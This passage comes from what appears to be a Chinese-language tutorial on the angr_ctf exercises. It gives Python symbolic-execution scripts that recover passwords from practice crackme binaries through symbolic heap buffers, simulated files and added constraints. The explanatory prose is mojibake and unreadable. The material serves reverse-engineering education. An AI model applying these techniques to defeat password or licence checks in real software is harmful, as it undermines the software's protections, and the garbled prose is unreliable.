keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Try again.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    solution0 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password0<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    solution1 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password1<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    solution <span class=\"token operator\">=</span> <span class=\"token string\">' '</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span> solution0<span class=\"token punctuation\">,</span> solution1 <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œ(IDA ä¸­) å¯ä»¥çœ‹åˆ°åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹åï¼Œæ ¹æ® mov ds:buffer0, eax å’Œ mov ds:buffer1, eax å¾—çŸ¥å¼€è¾Ÿåçš„ç¼“å†²åŒºè¢«å¤åˆ¶åˆ°æ ‡è¯†ä¸º buffer0 å’Œ buffer1 çš„ä¸¤ä¸ªå­˜å‚¨åŒºä¸­</p>\n<p>(è¿™é‡Œæ€»çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œä¹‹å‰æ˜¯ buffer æŒ‡å‘çš„æ˜¯ malloc åˆ†é…å¥½çš„å†…å­˜åœ°å€ï¼Œstring å­˜åœ¨è¿™é‡Œã€‚ç°åœ¨æ˜¯ buffer æŒ‡å‘çš„æ˜¯æˆ‘ä»¬ä¼ªé€ çš„åœ°å€ï¼Œç¬¦å·ä½å‘é‡å­˜åœ¨è¿™é‡Œ)</p>\n<p>å°†ä¸¤ä¸ªç¬¦å·å˜é‡å­˜å‚¨åˆ°ä¸€ä¸ªé¢„å…ˆåˆ†é…çš„ fake_heap_address0 å’Œ fake_heap_address1 åœ°å€ä¸­ï¼Œè¿™äº›åœ°å€æ˜¯æœªä½¿ç”¨çš„å †å†…å­˜åœ°å€ï¼ŒAngr ä½¿ç”¨ initial_state.memory.store å‡½æ•°å°†ç¬¦å·å˜é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€ä¸­ã€‚é€šè¿‡ä¿®æ”¹æŒ‡å‘ malloc åˆ†é…çš„å†…å­˜åœ°å€çš„æŒ‡é’ˆï¼ŒæŒ‡å‘ fake_heap_address0 å’Œ fake_heap_address1ï¼Œä»è€Œæ¬ºéª—ç¨‹åºï¼Œä½¿å…¶è®¤ä¸ºè¾“å…¥çš„å¯†ç å·²ç»å­˜å‚¨åœ¨ malloc åˆ†é…çš„å†…å­˜ä¸­ã€‚</p>\n<h3 id=\"07_angr_symbolic_file\"><a class=\"markdownIt-Anchor\" href=\"#07_angr_symbolic_file\">#</a> 07_angr_symbolic_file</h3>\n<p>å­¦ä¹ å¦‚ä½•ç¬¦å·åŒ–ä¸€ä¸ªæ–‡ä»¶é‡Œé¢çš„å†…å®¹</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 1. ç¡®å®š fread è¯»å–çš„æ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 2. ä½¿ç”¨ Angr æ¨¡æ‹Ÿä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè®©è¯»å–çš„æ–‡ä»¶è¢«æˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶æ›¿æ¢</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 3. ä½¿ç”¨ç¬¦å·å€¼åˆå§‹åŒ–æ–‡ä»¶ï¼Œè¯¥å€¼å°†ä½¿ç”¨ fread è¯»å–</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 4. æ±‚è§£ç¬¦å·è¾“å…¥ä»¥ç¡®å®šå¯†ç </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./07_angr_symbolic_file\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80488bc</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  filename <span class=\"token operator\">=</span> <span class=\"token string\">'FOQVSBZB.txt'</span>  <span class=\"token comment\"># :string</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  symbolic_file_size_bytes <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  password <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">,</span> symbolic_file_size_bytes <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  password_file <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>storage<span class=\"token punctuation\">.</span>SimFile<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span>password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>fs<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> password_file<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Good Job.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Try again.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">,</span>cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´åˆ©ç”¨ SimFile å½¢æˆç¬¦å·åŒ–çš„æ–‡ä»¶çš„æ ¼å¼ï¼š</p>\n<pre><code>simgr_file = angr.storage.SimFile(filename, content=xxxxxx, size=file_size)\n</code></pre>\n<p>è¯¥ä»£ç ä½¿ç”¨äº† Angr å·¥å…·æ¨¡æ‹Ÿäº†ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥è§£å†³å¯†ç éªŒè¯çš„é—®é¢˜ã€‚ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>ä½¿ç”¨ Angr åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šç¨‹åºå…¥å£åœ°å€ã€‚</li>\n<li>ä½¿ç”¨ initial_state.fs.insert å‡½æ•°å‘æ¨¡æ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ ä¸€ä¸ªåä¸ºâ€™FOQVSBZB.txtâ€™çš„æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ claripy.BVS å®šä¹‰äº†ä¸€ä¸ªåä¸º password çš„ç¬¦å·å˜é‡ï¼Œè¡¨ç¤ºå¯†ç ã€‚</li>\n<li>å°†ç¬¦å·å˜é‡ password å­˜å‚¨åˆ°æ¨¡æ‹Ÿæ–‡ä»¶ç³»ç»Ÿçš„â€™FOQVSBZB.txtâ€™æ–‡ä»¶ä¸­ï¼Œä½œä¸ºæ–‡ä»¶çš„å†…å®¹ã€‚</li>\n<li>ä½¿ç”¨ Angr çš„ simgr å¯¹è±¡ï¼Œå¯¹åˆå§‹çŠ¶æ€è¿›è¡Œç¬¦å·æ‰§è¡Œï¼Œé€šè¿‡æŒ‡å®šçš„ find å’Œ avoid æ¡ä»¶ï¼Œæ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„çŠ¶æ€ã€‚</li>\n<li>å¦‚æœæ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„çŠ¶æ€ï¼Œåˆ™ä»è¯¥çŠ¶æ€ä¸­æå–å‡º password çš„è§£ï¼Œè¾“å‡ºè§£ã€‚</li>\n<li>å¦‚æœæ— æ³•æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„çŠ¶æ€ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li>\n</ol>\n<p>è¯¥ä»£ç çš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡ç¬¦å·æ‰§è¡Œï¼Œå¯¹ç¨‹åºè¿›è¡Œæ¨¡æ‹Ÿï¼Œå¹¶åœ¨æ¨¡æ‹Ÿçš„æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†ç¬¦å·å˜é‡å­˜å‚¨åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚å› æ­¤ï¼Œå½“ç¨‹åºè°ƒç”¨ fread å‡½æ•°ä»æ–‡ä»¶ä¸­è¯»å–å¯†ç æ—¶ï¼Œå®é™…ä¸Šè¯»å–çš„æ˜¯ç¬¦å·å˜é‡ï¼ŒAngr å¯ä»¥é€šè¿‡ç¬¦å·æ‰§è¡Œæ¥è§£å†³å¯†ç éªŒè¯çš„é—®é¢˜ã€‚</p>\n<h3 id=\"08_angr_constraints\"><a class=\"markdownIt-Anchor\" href=\"#08_angr_constraints\">#</a> 08_angr_constraints</h3>\n<p>å­¦ä¹ é€šè¿‡æ·»åŠ çº¦æŸæ¡ä»¶æ¥è§£å†³è·¯å¾„çˆ†ç‚¸é—®é¢˜</p>\n<h4 id=\"è·¯å¾„çˆ†ç‚¸\"><a class=\"markdownIt-Anchor\" href=\"#è·¯å¾„çˆ†ç‚¸\">#</a> è·¯å¾„çˆ†ç‚¸</h4>\n<p>é€šè¿‡æˆ‘ä»¬ä¹‹å‰çš„å­¦ä¹ ä½“éªŒæ„Ÿè§‰åˆ° angr è¿™ä¹ˆå¼ºå¤§çš„åº”ç”¨æ€ä¹ˆæ²¡æœ‰åœ¨å®é™…çš„æµ‹è¯•ç”Ÿäº§ä¸­å¤§è§„æ¨¡åº”ç”¨ï¼Œè¿™æ˜¯å› ä¸ºç»™ç¬¦å·æ‰§è¡ŒæŠ€æœ¯åœ¨å¤æ‚ç¨‹åºçš„æµ‹è¯•æ¡ˆä¾‹ç”Ÿæˆçš„åº”ç”¨ä¸­é€ æˆé˜»ç¢çš„ä¸¤ä¸ªå¤§é—®é¢˜ï¼šä¸€ä¸ªæ˜¯çº¦æŸæ±‚è§£é—®é¢˜ï¼Œå¦ä¸€ä¸ªå°±æ˜¯è·¯å¾„çˆ†ç‚¸é—®é¢˜ (for ä¸­ if)</p>\n<p>æ‰€è°“ç¬¦å·æ‰§è¡Œå°±æ˜¯æŠŠç¨‹åºä¸­çš„å˜é‡ç¬¦å·åŒ–å»æ¨¡æ‹Ÿç¨‹åºè¿è¡Œï¼Œæœé›†è·¯å¾„çº¦æŸæ¡ä»¶å¹¶ä½¿ç”¨çº¦æŸæ±‚è§£å™¨å¯¹å…¶è¿›è¡Œæ±‚è§£åå¾—åˆ°ç»“æœã€‚</p>\n<p>å½“ä¸€ä¸ªç¨‹åºå­˜åœ¨å¾ªç¯ç»“æ„æ—¶ï¼Œå³ä½¿é€»è¾‘ååˆ†ç®€å•ä¹Ÿå¯èƒ½ä¼šäº§ç”Ÿè§„æ¨¡ååˆ†å·¨å¤§çš„æ‰§è¡Œè·¯å¾„ã€‚åœ¨ç¬¦å·æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªåˆ†æ”¯ç‚¹éƒ½ä¼šäº§ç”Ÿä¸¤ä¸ªå®ä¾‹ï¼Œå½“ç¨‹åºä¸­å­˜åœ¨å¾ªç¯ç»“æ„å±•å¼€æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºåˆ†æ”¯è·¯å¾„æ•°å‘ˆæŒ‡æ•°çº§å¢é•¿ï¼Œå³è·¯å¾„çˆ†ç‚¸é—®é¢˜ã€‚æ•…æˆ‘ä»¬éœ€è¦æä¾›æ›´å¤šçš„çº¦æŸæ¡ä»¶æ§åˆ¶è·¯å¾„çˆ†ç‚¸é—®é¢˜ã€‚</p>\n<h4 id=\"çº¦æŸæ±‚è§£\"><a class=\"markdownIt-Anchor\" href=\"#çº¦æŸæ±‚è§£\">#</a> çº¦æŸæ±‚è§£</h4>\n<p>åœ¨ angr ä¸­æä¾›äº†å¯ä»¥ç”¨åŠ å…¥ä¸€ä¸ªçº¦æŸæ¡ä»¶åˆ°ä¸€ä¸ª state ä¸­çš„æ–¹æ³•ï¼ˆstate.solver.addï¼‰ï¼Œå°†æ¯ä¸€ä¸ªç¬¦å·åŒ–çš„å¸ƒå°”å€¼ä½œä¸ºä¸€ä¸ªå…³äºç¬¦å·å˜é‡åˆæ³•æ€§çš„æ–­è¨€ã€‚ä¹‹åå¯ä»¥é€šè¿‡ä½¿ç”¨ state.solver.eval (symbol) å¯¹å„ä¸ªæ–­è¨€è¿›è¡Œè¯„æµ‹æ¥æ±‚å‡ºä¸€ä¸ªåˆæ³•çš„ç¬¦å·å€¼ï¼ˆè‹¥æœ‰å¤šä¸ªåˆæ³•å€¼ï¼Œè¿”å›å…¶ä¸­çš„ä¸€ä¸ªï¼‰ã€‚ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡ .add å¯¹ state å¯¹è±¡æ·»åŠ çº¦æŸï¼Œå¹¶ä½¿ç”¨ .eval æ¥å£æ±‚è§£ï¼Œå¾—åˆ°ç¬¦å·å˜é‡çš„å¯è¡Œè§£</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./08_angr_constraints\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804863c</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  password <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  password_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804a040</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>password_address<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\"># Angr will not be able to reach the point at which the binary prints out</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\"># 'Good Job.'. We cannot use that as the target anymore.</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  address_to_check_constraint <span class=\"token operator\">=</span> <span class=\"token number\">0x8048683</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>address_to_check_constraint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    constrained_parameter_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804a040</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    constrained_parameter_size_bytes <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    constrained_parameter_bitvector <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      constrained_parameter_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      constrained_parameter_size_bytes</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># We want to constrain the system to find an input that will make</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\"># constrained_parameter_bitvector equal the desired value.</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    constrained_parameter_desired_value <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># :string (encoded)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    solution_state<span class=\"token punctuation\">.</span>add_constraints<span class=\"token punctuation\">(</span>constrained_parameter_bitvector <span class=\"token operator\">==</span> constrained_parameter_desired_value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span 